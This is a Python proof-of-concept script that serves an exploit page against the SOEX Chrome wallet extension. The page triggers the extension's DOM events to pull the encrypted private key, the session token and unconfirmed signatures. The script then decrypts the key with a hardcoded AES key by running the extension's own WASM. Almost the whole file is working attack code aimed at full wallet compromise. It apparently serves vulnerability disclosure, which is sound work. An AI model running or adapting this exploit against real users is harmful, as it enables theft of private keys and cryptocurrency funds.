#!/usr/bin/env python3
"""
SOEX Chrome Extension — Private Key Theft PoC (CONFIRMED CRITICAL)
F1: signMessageSync + hardcoded AES key  →  plaintext private key
F2: evmPersonalSign/sign without confirmation

Run:   python3 soex_poc_server.py
Open:  http://localhost:3000  in Chrome with SOEX extension installed + wallet UNLOCKED

Requirements:  pip install eth-account pycryptodome
"""

import http.server, json, subprocess, sys, os, textwrap
from pathlib import Path

PORT = 3000
EXT_DIR = "/tmp/soex_ext"           # extracted CRX location
WASM    = f"{EXT_DIR}/rustlib_crypto_bg.90765c09.wasm"
HARDCODED_KEY = "39313966663965663534623839656534"

# ── inline Node.js decryptor using extension's own WASM ─────────────────────
DECRYPT_JS = r"""
const fs = require('fs');
const wasmBytes = fs.readFileSync(process.argv[2]);
const encHex    = process.argv[3];
const key       = process.argv[4];

const imports = {
  wbg: {
    __wbg_alert_1104cb786f0444a0: () => {},
    __wbindgen_throw: (ptr, len) => {
      const msg = new TextDecoder().decode(new Uint8Array(instance.exports.memory.buffer, ptr, len));
      throw new Error(msg);
    }
  }
};
let instance;
WebAssembly.instantiate(wasmBytes, imports).then(r => {
  instance = r.instance;
  const exp = instance.exports;
  const mem = () => new Uint8Array(exp.memory.buffer);
  let cachedLen = 0;

  function writeBytes(data) {
    const ptr = exp.__wbindgen_malloc(data.length) >>> 0;
    mem().set(data, ptr); return ptr;
  }
  function writeStr(str) {
    const enc = new TextEncoder().encode(str);
    const ptr = exp.__wbindgen_malloc(enc.length) >>> 0;
    mem().set(enc, ptr); cachedLen = enc.length; return ptr;
  }

  function aes_decrypt(data, key, iv) {
    const retptr = exp.__wbindgen_add_to_stack_pointer(-16);
    const dp = writeBytes(data); const dl = data.length;
    const kp = writeStr(key);   const kl = new TextEncoder().encode(key).length;
    const ip = writeStr(iv);    const il = new TextEncoder().encode(iv).length;
    exp.aes_decrypt(retptr, dp, dl, kp, kl, ip, il);
    const i32 = new Int32Array(exp.memory.buffer);
    const outPtr = i32[retptr/4+0], outLen = i32[retptr/4+1];
    const out = new Uint8Array(exp.memory.buffer).slice(outPtr, outPtr+outLen);
    exp.__wbindgen_free(outPtr, outLen);
    exp.__wbindgen_add_to_stack_pointer(16);
    return out;
  }

  const encBytes = Buffer.from(encHex, 'hex');
  const dec = aes_decrypt(encBytes, key, '');
  process.stdout.write(new TextDecoder().decode(dec));
}).catch(e => { process.stderr.write(e.message); process.exit(1); });
"""

# ── write the decrypt helper ─────────────────────────────────────────────────
DECRYPT_SCRIPT = "/tmp/soex_decrypt.js"
with open(DECRYPT_SCRIPT, "w") as f:
    f.write(DECRYPT_JS)

def decrypt_privkey(enc_hex, key=HARDCODED_KEY):
    """Decrypt stolen private key using the extension's own WASM."""
    try:
        result = subprocess.run(
            ["node", DECRYPT_SCRIPT, WASM, enc_hex, key],
            capture_output=True, text=True, timeout=10
        )
        if result.returncode == 0:
            return result.stdout.strip()
        return f"[decrypt error: {result.stderr.strip()[:80]}]"
    except Exception as e:
        return f"[decrypt failed: {e}]"

def verify_address(privkey_hex):
    """Derive Ethereum address from private key."""
    try:
        from eth_account import Account
        acct = Account.from_key("0x" + privkey_hex)
        return acct.address
    except Exception:
        return "(install eth-account to verify)"

# ── HTML exploit page ────────────────────────────────────────────────────────
HTML = r"""<!DOCTYPE html>
<html>
<head>
<title>SOEX Extension - Private Key Theft PoC</title>
<style>
  body{font-family:monospace;background:#111;color:#0f0;padding:20px}
  h2{color:#f90}.ok{color:#0f0}.err{color:#f44}.warn{color:#ff0}
  pre{white-space:pre-wrap;word-break:break-all}
</style>
</head>
<body>
<h2>SOEX Extension — Private Key Theft PoC</h2>
<pre id="log"></pre>
<script>
const results = {};

function log(cls, msg) {
    const ts = new Date().toISOString().slice(11,23);
    const el = document.createElement('span');
    el.className = cls;
    el.textContent = `[${ts}] ${msg}\n`;
    document.getElementById('log').appendChild(el);
    fetch('/result',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({ts,cls,msg})}).catch(()=>{});
}

// Step 3a — F1: encrypted private key (hardcoded AES key)
window.addEventListener('signMessageSyncSuccess', function(e) {
    const enc = e.detail.signRes;
    if (!enc) { log('err','[signMessageSyncSuccess] empty — wallet locked?'); return; }
    log('ok', '[F1 ✓] signMessageSyncSuccess received!');
    log('ok', '  enc_privkey : ' + enc);
    log('ok', '  aes_key     : 39313966663965663534623839656534 (HARDCODED)');
    results.f1_enc = enc;
    fetch('/decrypt', {method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({enc, key:'39313966663965663534623839656534', label:'F1'})
    }).then(r=>r.json()).then(d=>{
        log('ok','  privkey     : ' + d.privkey);
        log('ok','  address     : ' + d.address);
        log('ok','  ✓ FULL WALLET COMPROMISE — funds can be drained');
    });
});

// Step 3b — F1-ALT: key AND ciphertext returned in same event
window.addEventListener('encryptPrivateKeySuccess', function(e) {
    const state = e.detail.state;
    const enc   = e.detail.signRes;
    if (!state) { log('err','[F1-ALT] empty state'); return; }
    // aes_key = toHex(toUint8Array(state)) = hex of UTF-8 bytes of state
    const aesKey = Array.from(new TextEncoder().encode(state))
                        .map(b=>b.toString(16).padStart(2,'0')).join('');
    log('ok', '[F1-ALT ✓] encryptPrivateKeySuccess — key+cipher in same event!');
    log('ok', '  state (sha1): ' + state + '  →  aesKey: ' + aesKey);
    const encHex = Array.from(Object.values(enc)).map(b=>b.toString(16).padStart(2,'0')).join('');
    log('ok', '  enc_privkey : ' + encHex);
    fetch('/decrypt',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({enc:encHex, key:aesKey, label:'F1-ALT'})
    }).then(r=>r.json()).then(d=>{
        log('ok','  privkey     : ' + d.privkey);
        log('ok','  address     : ' + d.address);
    });
});

// F2 — session token
window.addEventListener('getSoexAuthSuccess', function(e) {
    log('ok','[F3 ✓] getSoexAuthSuccess: uid='+e.detail.uid+'  token='+e.detail.token);
});

// F2 — arbitrary Nostr signing (no confirmation)
window.addEventListener('signMessageSuccess', function(e) {
    if (e.detail?.signRes) log('ok','[F2 ✓] signMessageSuccess (no popup): '+e.detail.signRes);
});

// F2 — EVM signing (no confirmation)
window.addEventListener('evmPersonalSignSuccess', function(e) {
    if (e.detail?.signRes) log('ok','[F2 ✓] evmPersonalSignSuccess (no popup): '+e.detail.signRes);
});

// Step 2 — got address, now request private key
window.addEventListener('returnAccount', function(e) {
    const addr = e.detail.account;
    if (!addr) { log('err','[returnAccount] null — create wallet in extension first'); return; }
    log('ok', '[2] wallet address: ' + addr);
    window.dispatchEvent(new CustomEvent('signMessageSync',{detail:{address:addr,id:'p1'}}));
    window.dispatchEvent(new CustomEvent('encryptPrivateKey',{detail:{id:'p2'}}));
    window.dispatchEvent(new CustomEvent('sign',{detail:{message:'attacker-nostr-event',id:'p3'}}));
    window.dispatchEvent(new CustomEvent('evmPersonalSign',{detail:{message:'Login to evil.com',id:'p4'}}));
});

// Step 1 — discover address + session token
function attack() {
    window.dispatchEvent(new CustomEvent('currentAccount',{}));
    window.dispatchEvent(new CustomEvent('getSoexAuth',{detail:{reqId:'p0'}}));
}

let attempt=0;
function tryAttack(){
    attempt++;
    log('warn',`[attempt ${attempt}] firing events...`);
    attack();
    if(attempt<10 && !results.f1_enc) setTimeout(tryAttack,600);
    else if(results.f1_enc) { log('ok','[done] private key captured — stopping retries'); }
}
log('warn','Page loaded — waiting 800ms for content script...');
setTimeout(tryAttack, 800);
</script>
</body>
</html>
"""

# ── HTTP server ──────────────────────────────────────────────────────────────
class PoCHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path in ('/', '/poc', '/index.html'):
            body = HTML.encode()
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.send_header('Content-Length', str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_response(404); self.end_headers()

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data   = json.loads(self.rfile.read(length))

        if self.path == '/result':
            c = {'ok':'\033[92m','err':'\033[91m','warn':'\033[93m'}.get(data.get('cls',''),'')
            print(f"{c}[{data['ts']}] {data['msg']}\033[0m", flush=True)
            self._ok()

        elif self.path == '/decrypt':
            enc   = data['enc']
            key   = data['key']
            label = data.get('label','?')
            privkey = decrypt_privkey(enc, key)
            address = verify_address(privkey) if len(privkey) == 64 else "invalid"
            print(f"\033[92m[{label} DECRYPTED] privkey={privkey}  address={address}\033[0m", flush=True)
            resp = json.dumps({'privkey': privkey, 'address': address}).encode()
            self.send_response(200)
            self.send_header('Content-Type','application/json')
            self.send_header('Content-Length', str(len(resp)))
            self.end_headers()
            self.wfile.write(resp)
        else:
            self.send_response(404); self.end_headers()

    def _ok(self):
        self.send_response(200)
        self.send_header('Content-Type','application/json')
        self.end_headers()
        self.wfile.write(b'{}')

    def log_message(self, *a): pass

if __name__ == '__main__':
    # Check deps
    if not os.path.exists(WASM):
        print(f"\033[91m[!] WASM not found at {WASM} — extract the CRX first\033[0m")
        sys.exit(1)

    server = http.server.HTTPServer(('localhost', PORT), PoCHandler)
    print(f"\033[93m[SOEX PoC] http://localhost:{PORT}  — open in Chrome with SOEX extension + wallet unlocked\033[0m\n")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print('\n[SOEX PoC] Stopped.')
